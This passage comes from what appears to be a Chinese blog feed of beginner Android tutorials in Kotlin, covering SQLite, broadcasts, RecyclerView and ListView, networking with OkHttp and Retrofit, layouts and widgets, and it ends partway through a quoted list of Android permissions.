修改数据调用SQLiteOpenHelper的getReadableDatabase()或getWritableDatabase()方法是可以用于创建和升级数据库的，不仅如此，这两个方法还都会返回一个SQLiteDatabase对象，借助这个对象就可以对数据进行CRUD操作了。CRUD,四个基本操作就是增删改查。这里不做过于详细的示例，只说明大致用法：

insert():




参数
解释



表名
需要添加数据的表


默认值
当未指明某列的数据时，都会填充该数据


传入的数据
他需要接收ContentValues对象，这个对象可以通过put方法重载获得新方法


例如：



val values1 = ContentValues().apply &#123;                    // 开始组装第一条数据                    put(&quot;name&quot;, &quot;The Da Vinci Code&quot;)                    put(&quot;author&quot;, &quot;Dan Brown&quot;)                    put(&quot;pages&quot;, 454)                    put(&quot;price&quot;, 16.96)                &#125;                database.insert(&quot;Book&quot;, null, values1) // 插入第一条数据

update()




参数
解释



表名
需要添加数据的表


传入的数据
他需要接收ContentValues对象，这个对象可以通过put方法重载获得新方法


约束



约束



第三四个数据使用来约束更新那几行的数据，不指定的话，就会默认更新所有行



示例：



database.update(    &quot;Book&quot;,    ContentValues().apply &#123;        put(&quot;price&quot;, 10.99)    &#125;,    &quot;name = ?&quot;,    arrayOf(&quot;The Da Vinci Code&quot;))


delete()




参数
解释



表名
需要添加数据的表


约束



约束



第二三个数据都是用来约束行的



无示例




query()用来查询数据的，他接收到参数很多，如图：示例：val strings:StringBuilder=StringBuilder()                val cursor = database.query(&quot;Book&quot;, null, null, null, null, null, null)                if(cursor.moveToFirst())&#123;                    do&#123;                        //遍历所有cursor对象                        val name = cursor.getString(cursor.getColumnIndex(&quot;name&quot;))                        val author = cursor.getString(cursor.getColumnIndex(&quot;author&quot;))                        val pages = cursor.getInt(cursor.getColumnIndex(&quot;pages&quot;))                        val price = cursor.getDouble(cursor.getColumnIndex(&quot;price&quot;))                        strings.append(name+&quot;\t&quot;+author+&quot;\t&quot;+pages+&quot;\t&quot;+price+&quot;\n&quot;)                    &#125;while (cursor.moveToNext())                    textView.text = strings                    strings.clear()                    cursor.close()                &#125;
如果其他都不填的话，默认为select * from &#39;表名&#39;

也可以直接通过sql语言去实现这些功能
不做详细示例。凭个人喜好而学。
事务sqlite也支持事务：基本步骤为：调用SQLiteDatabase的方法

beginTransaction()方法开启一个事务
调用setTransactionSuccessful()表示事务已经执行成功
endTransaction()结束事务

数据库升级小技巧首先有一些前情提要：

如果库中已经存在某张表，如果再创建同名的表，将会导致报错，除非你把原表删除
一个应用程序的版本迭代会有多种可能，第一版到第二版甚至到第n版。如果因为没设置好升级功能。直接跳过版本迭代。导致的数据丢失。会使用户失去体验感。因此采取了以下措施：再onUpgrade()方法中，根据版本号进行迭代，如下：override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) &#123; if (oldVersion &lt;= 1) &#123; db.execSQL(createCategory) &#125; if (oldVersion &lt;= 2) &#123; db.execSQL(&quot;alter table Book add column category_id integer&quot;) &#125; &#125;
 这样子的好处就是，你从不同的版本迭代，都尽量帮你升级到最新版且保持数据不丢失

]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android入门(广播机制)</title>
    <url>/posts/86699eae/</url>
    <content><![CDATA[两种广播机制：

标准广播：完全异步执行的广播，几乎所有接受者都会同时受到这个广播消息。这种广播效率高，这也意味着它不能被截断
有序广播：同步执行的广播，根据接收者优先级顺序依次发送。而且中途可以被截断。A–&gt;B–&gt;C;B可以在中途截断广播的传输。

接受系统广播android内置了很多系统级别的广播，比如手机开机，电量变化。这些都可以接收。

动态接收class MainActivity : AppCompatActivity() &#123;    //声明一个时间改变接收器，它继承自BroadcastReceiver    lateinit var timeChangeReceiver: TimeChangeReceiver    override fun onCreate(savedInstanceState: Bundle?) &#123;        super.onCreate(savedInstanceState)        setContentView(R.layout.activity_main)        //声明一个intent过滤器，他和androidManifest中的配置项一样，可以限定接收那些action，catogory。        val intentFilter = IntentFilter()        //接收时间改变动作        intentFilter.addAction(&quot;android.intent.action.TIME_TICK&quot;)        timeChangeReceiver = TimeChangeReceiver()        //将该过滤器接收到的广播消息交给时间改变接收器        registerReceiver(timeChangeReceiver,intentFilter)    &#125;    override fun onDestroy() &#123;        super.onDestroy()        unregisterReceiver(timeChangeReceiver)    &#125;    //它通过重写onReceive方法去回调的执行方法    inner class TimeChangeReceiver:BroadcastReceiver()&#123;        override fun onReceive(context: Context, intent:Intent) &#123;            Toast.makeText(context,&quot;Time has changed&quot;,Toast.LENGTH_SHORT).show()        &#125;    &#125;&#125;

2.静态接收静态接收的步骤也简单：

声明一个BroadcastReceiver类，并重写他的onReceive方法
在AndroidManifest中注册使用它：&lt;activity				android:name=&quot;.MainActivity&quot;				android:exported=&quot;true&quot;&gt;			&lt;intent-filter&gt;				&lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;				&lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;			&lt;/intent-filter&gt;		&lt;/activity&gt;
这里表示它接收一个开启信号。
Android为了保护用户的隐私，有着严格的规定，对于某些比较敏感的操作，必须声明权限。不然程序直接奔溃无法启动。例如：

&lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;/&gt;
就必须声明了接收开机信号，才能在receiver中使用。

注意，不要再broadcast的onReceive中添加过多的逻辑，或者耗时操作。因为onReceive是不允许开启线程的。如果它运行了过长时间，程序就会报错。
发送广播标准广播class MainActivity : AppCompatActivity() &#123;    private lateinit var binding: ActivityMainBinding    override fun onCreate(savedInstanceState: Bundle?) &#123;        super.onCreate(savedInstanceState)        binding = ActivityMainBinding.inflate(layoutInflater)        setContentView(binding.root)        binding.apply &#123;            button.setOnClickListener &#123;                val intent = Intent(&quot;top.zfxt.My_BROADCAST&quot;)                //默认情况下我们发出的都是隐式广播，而Android8.0后，静态注册的接收器无法接收隐式广播                //因此我们需要显式的声明问要发给那个应用程序的，将他变为显示广播                intent.setPackage(packageName)                sendBroadcast(intent)            &#125;        &#125;    &#125;&#125;
这里我们用Intent来发送广播，发送一个我们自定义的广播：top.zfxt.My_BROADCAST。然后定义receive会接收该广播
&lt;receiver				android:name=&quot;.BootCompleteReceiver&quot;				android:enabled=&quot;true&quot;				android:exported=&quot;true&quot;&gt;			&lt;intent-filter&gt;				&lt;action android:name=&quot;top.zfxt.My_BROADCAST&quot;/&gt;			&lt;/intent-filter&gt;		&lt;/receiver&gt;
有序广播
将sendBroadcast换成sendOrderBroadcast//                sendBroadcast(intent)                //发送有序广播，第一个参数就是发送的intent，第二个参数是与权限相关的字符串。                sendOrderedBroadcast(intent,null)
发送有序广播的话，需要定义接收器的优先级，顺序。通过priority来定义。如：&lt;intent-filter android:priority=&quot;100&quot;&gt;数字越大，优先级越高。
有序广播是可以阻断的，所以可以再onReceive中使用abortBroadcast()，这个方法将会阻断广播的传播。

]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android入门（RecyclerView控件）</title>
    <url>/posts/f5884738/</url>
    <content><![CDATA[RecyclerView控件首先，他并不是系统自带的控件，而是在androidx中的，也就是还需要从外部导入。不过好在IDEA已经帮我们导入过了，在build.gralde中
dependencies &#123;    implementation &#x27;androidx.core:core-ktx:1.7.0&#x27;    implementation &#x27;androidx.appcompat:appcompat:1.4.1&#x27;    implementation &#x27;com.google.android.material:material:1.5.0&#x27;    implementation &#x27;androidx.constraintlayout:constraintlayout:2.1.3&#x27;    testImplementation &#x27;junit:junit:4.13.2&#x27;    androidTestImplementation &#x27;androidx.test.ext:junit:1.1.3&#x27;    androidTestImplementation &#x27;androidx.test.espresso:espresso-core:3.4.0&#x27;&#125;
导入之后就可以正常使用了
普通使用
首先直接在layout布局中声明一个recyclerView控件&lt;androidx.recyclerview.widget.RecyclerView            android:id=&quot;@+id/recyclerView&quot;            android:layout_width=&quot;match_parent&quot;            android:layout_height=&quot;match_parent&quot;/&gt;
然后继承他的适配器，直接放实例代码class Girl(val girlName: String, val girlImg: Int)&#123;&#125;class GirlAdapter(val girlList: List&lt;Girl&gt;) :    RecyclerView.Adapter&lt;GirlAdapter.ViewHolder&gt;() &#123;	inner class ViewHolder(view: View) : RecyclerView.ViewHolder(view) &#123;        val girlName = view.findViewById&lt;TextView&gt;(R.id.girlName)        val girlImg = view.findViewById&lt;ImageView&gt;(R.id.girlImg)    &#125;    override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder &#123;        val view = LayoutInflater.from(parent.context)            .inflate(R.layout.girl_item, parent, false)        return ViewHolder(view)    &#125;    override fun getItemCount() = girlList.size    override fun onBindViewHolder(holder: ViewHolder, position: Int) &#123;        val girl = girlList[position]        holder.girlImg.setImageResource(girl.girlImg)        holder.girlName.text = girl.girlName    &#125;&#125;
相较于listview：
他只需要接受一个data的参数，更容易理解其中的内容
他需要实现三个方法和一个内部类






属性
释义



ViewHolder
用来简化操作，提前维护好view变量，提高效率


onCreateViewHolder()
创建ViewHolder对象


getItemCount()
获取队列的总数


onBindViewHolder()
实现数据的绑定


3. 然后再需要使用他的地方，直接引用，直接给实例代码：

super.onCreate(savedInstanceState)setContentView(R.layout.activity_main)initFruits() // 初始化水果数据val layoutManager = LinearLayoutManager(this)recyclerView.layoutManager = layoutManagerval adapter = FruitAdapter(fruitList)recyclerView.adapter = adapter

创建了一个LinearLayoutManager对象，并将它设置到RecyclerView当中。LayoutManager用于指定RecyclerView的布局方式，这里使用的LinearLayoutManager是线性布局的意思，可以实现和ListView类似的效果

布局管理
主要得益于RecyclerView出色的设计。ListView的布局排列是由自身去管理的，而RecyclerView则将这个工作交给了LayoutManager。LayoutManager制定了一套可扩展的布局排列接口，子类只要按照接口的规范来实现，就能定制出各种不同排列方式的布局了。

除了LinearLayoutManager之外，RecyclerView还给我们提供了GridLayoutManager和StaggeredGridLayoutManager这两种内置的布局排列方式。GridLayoutManager可以用实现网格布局，StaggeredGridLayoutManager可以用于实现瀑布流布局线性布局都可以参照下面的实例给一个实例：
val layoutManager = StaggeredGridLayoutManager(3, StaggeredGridLayoutManager.VERTICAL) recyclerView.layoutManager = layoutManager val adapter = FruitAdapter(fruitList) recyclerView.adapter = adapter

点击事件首先，RecyclerView并没有像Listview一样定义了点击事件。他并没有专门的点击事件。他的点击事件需要根据具体的每个子项控件去设置。而这样往往更加方便使用和易于理解。下面是一个示例：
override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder &#123;        val view = LayoutInflater.from(parent.context)            .inflate(R.layout.girl_item, parent, false)        val viewHolder =  ViewHolder(view)		//itemView表示最外层布局，也就是整个子项        viewHolder.itemView.setOnClickListener &#123;            val position = viewHolder.adapterPosition			//获取当前点击处的序列号。            val girl = girlList[position]			//根据序列获得girl实例            Toast.makeText(parent.context,&quot;you clicked view $&#123;girl.girlName&#125;&quot;,Toast.LENGTH_SHORT).show()        &#125;        viewHolder.girlImg.setOnClickListener &#123;            val position = viewHolder.adapterPosition            val girl = girlList[position]            Toast.makeText(parent.context,&quot;you clicked img $&#123;girl.girlName&#125;&quot;,Toast.LENGTH_SHORT).show()        &#125;        return  viewHolder    &#125;
点击事件是在onCreateViewHolder中定义的。

上述代码分别为最外层布局和ImageView都注册了点击事件，itemView表示的就是最外层布局。RecyclerView的强大之处也在于此，它可以轻松实现子项中任意控件或布局的点击事件。我们在两个点击事件中先获取了用户点击的position，然后通过position拿到相应的Fruit实例，再使用Toast分别弹出两种不同的内容以示区别

]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android入门(网络)</title>
    <url>/posts/86a9b01e/</url>
    <content><![CDATA[WebView可以在应用中嵌入一个浏览器，从而展示各种网页
使用HTTP请求访问网络HttpURLConnection//他的流程是：//先设置一个Url地址，然后通过url打开一个连接并强转为HttpURLConnection并保存为一个connection对象//为这个对象设置请求方法，超时时间如.然后获取他的输入流，然后读取即可。thread &#123;val string = StringBuilder()val url = URL(&quot;https://zfxt.top/sentence&quot;)val connection = url.openConnection() as HttpURLConnectionconnection.requestMethod = &quot;GET&quot;connection.connectTimeout=8000connection.readTimeout=8000val input = connection.inputStreamval reader = input.bufferedReader()//使用use他会读取完成后自动关闭流reader.use &#123;string.append(it.readText())&#125;//因为这是在一个子线程上，是不允许修改ui的，所以要在主线程上执行。runOnUiThread &#123;binding.responseText.text = string&#125;connection.disconnect()&#125;
同时他也需要声明网络权限：&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;如果要像服务器发送post请求，那么就打开output流，然后输入数据，记得每个数据必须是键值对的形式，不同的数据需要用&amp;隔开。
OKhttp
先声明一个客户端val client = OKHttpClient()

然后声明一条请求request
//Get请求val request = Request().Builder()		.url()		.//可以连缀很多方法修饰其内容		.build()//Post请求稍微麻烦一点，需要构建一个对象val requestBody = FormBody.Build()...build()request=Request().Buildder().....post(requestBody).build()
而且request是分离的，低耦合。

获取响应val response = client.newCall(request).execute()

获取返回对象&#96;val data &#x3D; response.body?.string()


解析XML和JSON格式数据xmlpull解析private fun parseXMLWithPull(xmlData: String) &#123;        try &#123;            val factory = XmlPullParserFactory.newInstance()            val xmlPullParse = factory.newPullParser()            xmlPullParse.setInput(StringReader(xmlData))            var eventType = xmlPullParse.eventType            var id = &quot;&quot;            var name = &quot;&quot;            var version = &quot;&quot;            while (eventType != XmlPullParser.END_DOCUMENT) &#123;                val nodeName = xmlPullParse.name                when (eventType) &#123;                    //开始解析某个节点                    XmlPullParser.START_TAG -&gt; &#123;                        when (nodeName) &#123;                            &quot;id&quot; -&gt; id = xmlPullParse.nextText()                            &quot;name&quot; -&gt; name = xmlPullParse.nextText()                            &quot;version&quot; -&gt; version = xmlPullParse.nextText()                        &#125;                    &#125;                    //完整解析某个节点                    XmlPullParser.END_TAG -&gt; &#123;                        if (&quot;app&quot; == nodeName) &#123;                            Log.d(&quot;MainActivity&quot;, &quot;id is $id&quot;)                            Log.d(&quot;MainActivity&quot;, &quot;name is $name&quot;)                            Log.d(&quot;MainActivity&quot;, &quot;version is $version&quot;)                        &#125;                    &#125;                &#125;                eventType = xmlPullParse.next()            &#125;        &#125; catch (e: Exception) &#123;            e.printStackTrace()        &#125;    &#125;

sax解析不细讲，用的时候再学
json解析不细讲，自己理解还有GSON的使用。这些都是不难的东西，不需要特别理解。只要看一眼就会明白
网络请求回调的实现方法如果每次每次发送请求都写一遍发送HTTP请求的代码，就显得代码非常的难看。所以通常将这些通用的网络操作提取到一个公共的类里，并提供一个公用方法。
object HttpUtil &#123;    fun sendHttpRequest(address: String): String &#123;        var connection: HttpURLConnection? = null        try &#123;            val response = StringBuilder()            val url = URL(address)            connection = url.openConnection() as HttpURLConnection            connection.connectTimeout = 8000            connection.readTimeout = 8000            val input = connection.inputStream            val reader = BufferedReader(InputStreamReader(input))            reader.use &#123;                reader.forEachLine &#123;                    response.append(it)                &#125;            &#125;            return response.toString()        &#125; catch (e: Exception) &#123;            e.printStackTrace()            return e.message.toString()        &#125; finally &#123;            connection?.disconnect()        &#125;    &#125;&#125;
如上述代码所述，将一个网络请求封装起来。然后每次调用这个方法即可获得返回的数据但是，一个子线程是无法通过return返回数据回到主线程的。主线程并不会阻塞的等待他返回。所以往往会采用回调的方式去解决这个问题
//定义一个回调接口interface HttpCallbackListener &#123;	fun onFinish(response: String) 	fun onError(e: Exception)&#125;object HttpUtil &#123;    fun sendHttpRequest(address: String, listener: HttpCallbackListener) &#123;        thread &#123;            var connection: HttpURLConnection? = null            try &#123;                val response = StringBuilder()                val url = URL(address)                connection = url.openConnection() as HttpURLConnection                connection.connectTimeout = 8000                connection.readTimeout = 8000                val input = connection.inputStream                val reader = BufferedReader(InputStreamReader(input))                reader.use &#123;                    reader.forEachLine &#123;                        response.append(it)                    &#125;                &#125;                // 回调onFinish()方法                listener.onFinish(response.toString())            &#125; catch (e: Exception) &#123;                e.printStackTrace()                // 回调onError()方法                listener.onError(e)            &#125; finally &#123;                connection?.disconnect()            &#125;        &#125;    &#125;&#125;
重新写的方法他就可以使用回调。他相比于原来的方法，他多了一个参数，也就是传入一个HttpCallbackListener的实例类，然后通过这个实例中重写的方法去实现回调。当你在主线程中要使用到这个网络请求并回调时可以像下面这样写：
HttpUtil.sendHttpRequest(address, object : HttpCallbackListener &#123; 	override fun onFinish(response: String) &#123; // 得到服务器返回的具体内容 	&#125; 	override fun onError(e: Exception) &#123; // 在这里对异常情况进行处理 	&#125;&#125;)
你调用了网络请求，然后重写了这个方法，在子线程中，onFinish方法会阻塞直到返回数据，然后你在这边定义的方法中获取返回的数据。
OKhttp如果使用OKhttp的话，他的回调会更加简单，因为他内置了自行的方法。
fun sendOkHttpRequest(address: String, callback: okhttp3.Callback) &#123;	 val client = OkHttpClient()	 val request = Request.Builder() 		.url(address)		 .build() 	client.newCall(request).enqueue(callback) &#125;
他这里没有使用execute，而是使用enqueue，他会帮我们在子线程中执行这个网络请求，并且请求完成后，返回到这个callback中。如果要使用的话，也是一样要重写方法
HttpUtil.sendOkHttpRequest(address, object : Callback &#123; override fun onResponse(call: Call, response: Response) &#123; // 得到服务器返回的具体内容 val responseData = response.body?.string() &#125; override fun onFailure(call: Call, e: IOException) &#123; // 在这里对异常情况进行处理 &#125;&#125;)
这样子也很简单
Retrofit网络框架他同样也是Square开发的网络库，与OKhttp相比，他的定位是应用层的网络通信库，而OKhttp是底层通信的实现。他有哪些优点：

可以配置一个根路径，然后具体的请求接口只需要使用相对路径即可
他可以对服务器接口进行归类，把同一类的服务器接口定义到同一个接口文件中。
相比于GSON中对于list数据，需要声明type，这里的强大泛型类，可以直接使用Retrofit导入如下的包implementation &#x27;com.squareup.retrofit2:retrofit:2.6.1&#x27;implementation &#x27;com.squareup.retrofit2:converter-gson:2.6.1&#x27;
他是基于OKhttp开发的，所以他会把retrofit，okhttp，okio都下载下来，而第二个包则会辅助把gson一起下载下来，他会自动解析gson。给一个样例：class App(val id: String, val name: String, val version: String)interface AppService&#123;    @GET(&quot;get_data.json&quot;)    fun getAppData():Call&lt;List&lt;App&gt;&gt;&#125;fun main()&#123;    val retrofit = Retrofit.Builder()        .baseUrl(&quot;https://zfxt.top/&quot;)        .addConverterFactory(GsonConverterFactory.create())        .build()    val appService = retrofit.create(AppService::class.java)    appService.getAppData().enqueue(object : Callback&lt;List&lt;App&gt;&gt;&#123;        override fun onResponse(call: Call&lt;List&lt;App&gt;&gt;, response: Response&lt;List&lt;App&gt;&gt;) &#123;           val list = response.body()            if(list!=null)&#123;                for(app in list)&#123;                    println(app.id)                    println(app.name)                    println(app.version)                &#125;            &#125;        &#125;        override fun onFailure(call: Call&lt;List&lt;App&gt;&gt;, t: Throwable) &#123;            t.printStackTrace()        &#125;    &#125;) 	&#125;

他会自动切换线程去完成操作，不用你去考虑切换线程和回调的关系。这里他访问的接口是https://zfxt.top/get_data.json。但是如果我们访问的路径中有动态变化的参数的话，我们需要传递参数进去，如:路径占位符，也可能是符合restfulAPI的写法
interface ExampleService &#123; @GET(&quot;&#123;page&#125;/get_data.json&quot;) fun getData(@Path(&quot;page&quot;) page: Int): Call&lt;Data&gt;&#125;
如果要传递参数
//GET http://example.com/get_data.json?u=&lt;user&gt;&amp;t=&lt;token&gt;interface ExampleService &#123; @GET(&quot;get_data.json&quot;) fun getData(@Query(&quot;u&quot;) user: String, @Query(&quot;t&quot;) token: String): Call&lt;Data&gt;&#125;
有时候我们对于返回的数据并不是特别关心其具体内容，可能只是一个普通的字符串，所以用不着去解析他，可以用Call来返回数据。他可以接收任意类型的参数。如果我们要发送post请求并带上body。那么带上@Body注解很有用：
interface ExampleService &#123; @POST(&quot;data/create&quot;) fun createData(@Body data: Data): Call&lt;ResponseBody&gt;&#125;
body注解中的内容会被转化为json格式的文本发送出去我们还可以在方法上添加@Headers：如@Headers(&quot;User-Agent: okhttp&quot;, &quot;Cache-Control: max-age=0&quot;)他里面都是键值对，但是如果我们要使用动态的header的话：
interface ExampleService &#123; @GET(&quot;get_data.json&quot;) fun getData(@Header(&quot;User-Agent&quot;) userAgent: String, @Header(&quot;Cache-Control&quot;) cacheControl: String): Call&lt;Data&gt;&#125;
我们还需要传递一个参数进去，为字符串格式
retrofit的最佳写法把retrofit封装为一个单例类在其中定义一个方法，接收各种泛型，然后创建：
object ServiceCreator &#123;	 private const val BASE_URL = &quot;http://10.0.2.2/&quot;	 private val retrofit = Retrofit.Builder()	 .baseUrl(BASE_URL)	 .addConverterFactory(GsonConverterFactory.create())	 .build()	 fun &lt;T&gt; create(serviceClass: Class&lt;T&gt;): T = retrofit.create(serviceClass)&#125;
因为泛型在编译后会被擦除，所以我们这里只有传递参数进去才可以实现创建。但如果使用实化，也就是使用inline fun &lt;reified T&gt; create(): T = create(T::class.java)代替上述代码中的create放啊发。他就可以通过泛型直接创建。
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android入门（listview控件）</title>
    <url>/posts/15967b87/</url>
    <content><![CDATA[很烦，，，写了好久然后浏览器闪退了。。。然后写的全无了。所以再写一遍就随便写点了。使用listview的关键。
基本使用
直接在布局引入一个listview控件
然后因为listview的数据不能直接传入。需要通过adapter适配器来实现的，其中最常用的就是arrayAdapter
因此在activity中，初始化一个arrayAdapter。 他的初始化一共需要三个参数。
activity：也就是需要把本类传进去。
resourceid: 需要传入子项布局（也就是listview中每一项内容的样式布局）（可以使用系统默认的，也可以自己定义一个布局。这里不展示）
data：传入数据源，一般都是列表。


然后使lisview的adapter属性赋值为你初始的内容listview.adapter = arrayAdapter&lt;String&gt;()
然后即完成了基本使用。

进阶使用主要就是修改第二个参数，resourceid，也就是你自己定义的布局和样式。但是你不止需要样式，还需要设置逻辑。因此这里选择再写一个适配器FruitAdapter去继承ArrayAdapter，然后重写getView()方法，实现重现。getView()的三个属性

position：表明当前的对应的在数据源的第几个序列
convertView： 用来缓存View，如果已经有缓存，可以大大提高效率。
parent：父元素具体的逻辑就是：先获取你需要修改的布局，并将其转化成view。然后通过函数来修改其中每个部分的内容。以下是个示例代码：class Fruit(val name: String, val imageId: Int) &#123;&#125;class FruiterAdapter(activity: Activity, val resourceId: Int, data: List&lt;Fruit&gt;) :    ArrayAdapter&lt;Fruit&gt;(activity, resourceId, data) &#123;    override fun getView(position: Int, convertView: View?, parent: ViewGroup): View &#123;        //直接将布局文件转化为View类        val view = LayoutInflater.from(context).inflate(resourceId, parent, false)        val fruitImage: ImageView = view.findViewById(R.id.fruitImage)        val fruitName: TextView = view.findViewById(R.id.fruitName)        val fruit = getItem(position)//获取当前项的Fruit实例        if (fruit != null) &#123;            fruitImage.setImageResource(fruit.imageId)            fruitName.text = fruit.name        &#125;        return view        //使用视图绑定//        var binding = FruitItemBinding.inflate(LayoutInflater.from(context),parent,false)//        binding.apply &#123;//            var fruit = getItem(position)//            if(fruit!=null)&#123;//                fruitImage.setImageResource(fruit.imageId)//                fruitName.text = fruit.name//            &#125;//        &#125;//        return binding.root    &#125;&#125;

提高效率
使用convertView，他已经缓存了页面，可以大大提高运行效率
使用viewholder，他可以被存放在view.tag中。也可以从convertView中取出。使用它可以避免很多次findViewById以上两种方法可以大大的提高效率

点击事件直接上示例代码
listView.setOnItemClickListener &#123; parent, view, position, id -&gt; val fruit = fruitList[position] Toast.makeText(this, fruit.name, Toast.LENGTH_SHORT).show() &#125;
 其中如果有不需要用到的参数，可以直接用_代替，不去接受 listView.setOnItemClickListener &#123; _,_, position, _ -&gt; val fruit = fruitList[position] Toast.makeText(this, fruit.name, Toast.LENGTH_SHORT).show() &#125;
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android常用布局</title>
    <url>/posts/1343ead2/</url>
    <content><![CDATA[布局和控件的关系
LinearLayout


属性
释义
样例



orientation
指定了排列方向
vertical，horizontal


layout_gravity
控制控件的对齐方式



layout_weight
指定控件的大小




一般会将layout_width指定为0dp，这是一种标准的写法

layout_weight的计算方式系统会先把LinearLayout下所有控件指定的layout_weight值相加，得到一个总值，然后每个控件所占大小的比例就是用该控件的layout_weight值除以刚才算出的总值。因此如果想让EditText占据屏幕宽度的3&#x2F;5，Button占据屏幕宽度的2&#x2F;5，只需要将EditText的layout_ weight改成3，Button的layout_weight改成2就可以了。
RelativeLayout相对布局
&lt;Button android:id=&quot;@+id/button5&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_alignParentBottom=&quot;true&quot; android:layout_alignParentRight=&quot;true&quot; android:text=&quot;Button 5&quot; /&gt;
大致内容即上，用来描述与父容器的相对位置关系layout_abovelayout_belowlayout_toLeftOflayout_toRightOf相对其他控件，进行位置的比较layout_alignLeftlayout_alignRightlayout_alignToplayout_alignBottom也是相对于其他控件，但是他是边缘进行对齐
FrameLayout帧布局它的应用场景比较少。这种布局没有丰富的定位方式，所有的控件都会默认摆放在布局的左上角。而且他可以控件之间相互覆盖，压在其他控件上
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android常用控件</title>
    <url>/posts/a071fa17/</url>
    <content><![CDATA[常用控件TextView显示文本



属性
释义
样例



gravity
来指定文字的对齐方式
top,bottom,start等


textColor
指定文字颜色
red，green


textSize
指定文字大小
sp为单位，这样当用户在系统中修改了文字显示尺寸时，应用


程序中的文字大小也会跟着变化。重新运行程序




text
指定文字内容



Button放置按钮



属性
释义
样例



textAllCaps
指定文字是否大小写
false,true


注册Button点击事件的方式

函数式APIbutton.setOnClickListener &#123; // 在此处添加逻辑 &#125;
 2.用实现接口的方式来进行注册  class MainActivity : AppCompatActivity(),View.OnClickListener &#123;	 override fun onCreate(savedInstanceState: Bundle?) &#123;		 super.onCreate(savedInstanceState)		 setContentView(R.layout.activity_main)		 //让button使用本类中的方法 		button.setOnClickListener(this)	 &#125; override fun onClick(v: View?) &#123;	 when (v?.id) &#123;		 R.id.button -&gt; &#123;		 // 在此处添加逻辑		 &#125;	 &#125; &#125;&#125;

EditText允许用户在控件里输入和编辑内容



属性
释义
样例



hint
段提示性的文本
输入文字后消失


maxLines
最大行数
超过行数会自动滚动


ImageView图片展示

图片通常是放在以drawable开头的目录下的，并且要带上具体的分辨率。现在最主流的手机屏幕分辨率大多是xxhdpi的，所以我们在res目录下再新建一个drawable-xxhdpi目录，然后将事先准备好的两张图片img_1.png和img_2.png复制到该目录当中




属性
释义
样例



src
选择图片文件
@drawable&#x2F;img_1


setImageResource()
修改图片资源
在函数中修改


ProgressBar进度条



属性
释义
样例



visibility
是否可见
这个值是默认值，不指定android:visibility时，控件都是可见的。invisible表示控件不可见，但是它仍然占据着原来的位置和大小，可以理解成控件变成透明状态了。gone则表示控件不仅不可见，而且不再占用任何屏幕空间。


setVisibility()
通过函数修改进度条的可见性
View.VISIBLE，View.INVISIBLE和View.GONE


style
进度条样式
“?android:attr&#x2F;progressBarStyleHorizontal”


max
给进度条设置一个最大值
可以在代码中动态修改进度


progressBar.progress+=10

AlertDialog在当前界面弹出一个对话框
常用展示方法
AlertDialog.Builder(this).apply &#123; setTitle(&quot;This is Dialog&quot;) setMessage(&quot;Something important.&quot;) setCancelable(false) //能否通过取消键取消 setPositiveButton(&quot;OK&quot;) &#123; dialog, which -&gt; &#125; setNegativeButton(&quot;Cancel&quot;) &#123; dialog, which -&gt; &#125; show() &#125;
 
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android权限说明(引用）</title>
    <url>/posts/e9b7c22/</url>
    <content><![CDATA[
引用自掘金

访问登记属性android.permission.ACCESS_CHECKIN_PROPERTIES，读取或写入登记check-in数据库属性表的权限 
获取错略位置android.permission.ACCESS_COARSE_LOCATION，通过WiFi或移动基站的方式获取用户错略的经纬度信息，定位精度大概误差在30~1500米 
获取精确位置android.permission.ACCESS_FINE_LOCATION，通过GPS芯片接收卫星的定位信息，定位精度达10米以内
访问定位额外命令android.permission.ACCESS_LOCATION_EXTRA_COMMANDS，允许程序访问额外的定位提供者指令 
获取模拟定位信息android.permission.ACCESS_MOCK_LOCATION，获取模拟定位信息，一般用于帮助开发者调试应用 
获取网络状态android.permission.ACCESS_NETWORK_STATE，获取网络信息状态，如当前的网络连接是否有效 
访问Surface Flinger android.permission.ACCESS_SURFACE_FLINGER，Android平台上底层的图形显示支持，一般用于游戏或照相机预览界面和底层模式的屏幕截图 
获取WiFi状态android.permission.ACCESS_WIFI_STATE，获取当前WiFi接入的状态以及WLAN热点的信息 
账户管理android.permission.ACCOUNT_MANAGER，获取账户验证信息，主要为GMail账户信息，只有系统级进程才能访问的权限 
验证账户android.permission.AUTHENTICATE_ACCOUNTS，允许一个程序通过账户验证方式访问账户管理ACCOUNT_MANAGER相关信息
电量统计android.permission.BATTERY_STATS，获取电池电量统计信息 
绑定小插件android.permission.BIND_APPWIDGET，允许一个程序告诉appWidget服务需要访问小插件的数据库，只有非常少的应用才用到此权限 
绑定设备管理android.permission.BIND_DEVICE_ADMIN，请求系统管理员接收者receiver，只有系统才能使用 
绑定输入法android.permission.BIND_INPUT_METHOD，请求InputMethodService服务，只有系统才能使用 
绑定RemoteView android.permission.BIND_REMOTEVIEWS，必须通过RemoteViewsService服务来请求，只有系统才能用 
绑定壁纸android.permission.BIND_WALLPAPER，必须通过WallpaperService服务来请求，只有系统才能用 
使用蓝牙android.permission.BLUETOOTH，允许程序连接配对过的蓝牙设备 
蓝牙管理android.permission.BLUETOOTH_ADMIN，允许程序进行发现和配对新的蓝牙设备 
变成砖头android.permission.BRICK，能够禁用手机，非常危险，顾名思义就是让手机变成砖头 
应用删除时广android.permission.BROADCAST_PACKAGE_REMOVED，当一个应用在删除时触发一个广播 
收到短信时广播android.permission.BROADCAST_SMS，当收到短信时触发一个广播 
连续广播android.permission.BROADCAST_STICKY，允许一个程序收到广播后快速收到下一个广播 
